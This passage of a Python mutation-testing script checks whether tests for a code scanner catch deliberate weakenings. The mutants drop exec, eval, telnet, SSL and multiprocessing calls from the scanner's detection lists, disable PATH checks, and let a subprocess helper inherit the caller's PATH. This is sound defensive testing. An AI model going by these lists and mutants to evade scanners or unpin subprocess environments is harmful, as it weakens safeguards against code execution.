             ("            if node.attr in LOOP_METHODS:\n",
              "            if node.attr in LOOP_METHODS and not self.resolve(node.value):\n"))),
     ROUND3, "create_connection"),
    ("scanner drops code run from a string", one(TEST,
     replace(('"builtins.exec", "builtins.eval", "runpy.run_module", "runpy.run_path",',
              '"runpy.run_module", "runpy.run_path",'))), ROUND3, "builtins.exec"),
    ("a rebound builtin read as the builtin", one(TEST,
     replace(("return isinstance(node, ast.Name) and node.id in names and node.id not in self.bound",
              "return isinstance(node, ast.Name) and node.id in names"))), ROUND3, "subprocess.Popen"),
    ("scanner drops the multiprocessing contexts and pools", one(TEST,
     replace(('"multiprocessing.get_context", "multiprocessing.Manager", "multiprocessing.pool.Pool",',
              '"multiprocessing.Manager",'))), ROUND3, "multiprocessing"),
    ("scanner drops ssl.get_server_certificate", one(TEST,
     replace(('"ssl.get_server_certificate", "telnetlib.Telnet",', '"telnetlib.Telnet",'))),
     ROUND3, "get_server_certificate"),
    ("scanner records no shutil.which lookups", one(TEST,
     replace(('if "shutil.which" in names:', "if False:"))), LOOKUPS, "dpkg-query"),
    ("lookups ignore the child's env", one(TEST,
     replace(('searches = COMPUTED if wrapped and not callees & ARGV_FIRST else self._env_path(keywords.get("env"))',
              "searches = AMBIENT"))), LOOKUPS, "/usr/bin:/bin"),
    ("lookup searches mismatch never reported", one(TEST,
     replace(('if entry["searches"] != searches:', "if False:"))), LOOKUPS, "SEARCHES MISMATCH"),
    ("envelope claims never checked", one(TEST,
     replace(("if any(word in text.lower() for word in ENVELOPE_WORDS) and AMBIENT not in text:", "if False:"))),
     ENVELOPE, "ENVELOPE CLAIM"),
    ("scanner stops following imports out of greg/", one(TEST,
     replace(("        queue += [found for dotted in sorted(imported_names(relative, sources[relative]))",
              "        queue += [] and [found for dotted in sorted(imported_names(relative, sources[relative]))"))),
     IMPORTS, "helpers"),
    ("tools/ dropped from the module roots", one(TEST,
     replace(('MODULE_ROOTS = ("", "tools")', 'MODULE_ROOTS = ("",)'))), ROOTS, "MODULE_ROOTS"),
    ("_tracked_run hands the caller's env, PATH included, to its child (#273 re-review 2, E)", one("greg/workers.py",
     replace(('env={**env, "PATH": "/usr/bin:/bin"}, start_new_session=True)', 'env=env, start_new_session=True)'))),
     TREE, "PIN MISMATCH allowed greg/workers.py :: _tracked_run :: subprocess.Popen"),
    ("_tracked_run widens the PATH its git calls search (#273 re-review 2, E)", one("greg/workers.py",
     replace(('env={**env, "PATH": "/usr/bin:/bin"}', 'env={**env, "PATH": os.environ.get("PATH", "")}'))),
     TREE, "PIN MISMATCH allowed greg/workers.py :: _tracked_run :: subprocess.Popen"),
]


def purge_bytecode(repo: Path) -> None:
    for cache in repo.rglob("__pycache__"):
        shutil.rmtree(cache, ignore_errors=True)


def run(repo: Path, node: str) -> subprocess.CompletedProcess:
    purge_bytecode(repo)
    return subprocess.run([sys.executable, "-B", "-m", "pytest", "-q", "-x", "-p", "no:cacheprovider", "--tb=short",
                           node], cwd=repo, env={**os.environ, "PYTHONPATH": str(repo), "PYTHONDONTWRITEBYTECODE": "1"},
                          capture_output=True, text=True, timeout=600, check=False)


def main() -> int:
    invalid = 0
    with tempfile.TemporaryDirectory(prefix="greg-effect-call-mutants-") as temp:
        repo = Path(temp) / "repo"
        shutil.copytree(ROOT, repo, ignore=shutil.ignore_patterns(".git", "__pycache__", ".pytest_cache"))
        baseline = run(repo, TEST)
        if baseline.returncode != 0:
            print("BASELINE_FAILS", baseline.stdout[-2000:])
            return 1
        print("BASELINE passes")
        for name, edits, node, expected in MUTANTS:
            saved, stale = [], None
            for relative, mutate in edits:
                path = repo / relative
                original = path.read_text() if path.exists() else None
                saved.append((path, original))
                try:
                    path.write_text(mutate(original))
                except LookupError as exc:
                    stale = exc
                    break
            try:
                result = None if stale else run(repo, node)
            finally:
                for path, original in reversed(saved):
                    path.write_text(original) if original is not None else path.unlink(missing_ok=True)
            if stale:
                print("STALE", name, stale)
                invalid += 1
                continue
            caught = (result.returncode == 1 and f"FAILED {node}" in result.stdout and expected in result.stdout
                      and "ERROR collecting" not in result.stdout)
            print("CAUGHT" if caught else "SURVIVED_OR_INVALID", name)
            invalid += not caught
    print(f"{len(MUTANTS) - invalid}/{len(MUTANTS)} caught")
    return int(bool(invalid))


if __name__ == "__main__":
    raise SystemExit(main())
